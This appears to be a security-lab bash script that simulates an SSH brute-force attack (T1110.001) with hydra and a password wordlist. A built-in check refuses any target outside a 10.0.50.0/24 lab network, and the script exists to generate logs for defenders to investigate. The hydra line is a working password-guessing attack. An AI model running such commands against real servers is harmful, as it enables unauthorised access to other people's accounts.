#!/usr/bin/env bash
# SSH brute force simulation (T1110.001). Run from kali-attacker against linux-endpoint.
# The last password in lab-passwords.txt is correct, so the attack "succeeds",
# which gives you a brute-force-then-success story to investigate.
#
# Usage: bash ssh-bruteforce.sh [target_ip]
set -euo pipefail

TARGET="${1:-10.0.50.30}"
USER_NAME="labvictim"
WORDLIST="$(dirname "$0")/lab-passwords.txt"

case "$TARGET" in
  10.0.50.*) ;;
  *) echo "Refusing to run: target must be on the lab network (10.0.50.0/24)." >&2; exit 1 ;;
esac

command -v hydra >/dev/null || { echo "hydra not found: sudo apt install -y hydra" >&2; exit 1; }

echo "Starting SSH brute force against ${USER_NAME}@${TARGET} at $(date)"
# -t 4: four parallel tasks (gentle). -f: stop at the first valid password.
hydra -l "${USER_NAME}" -P "${WORDLIST}" -t 4 -f "ssh://${TARGET}"
echo "Finished at $(date)"
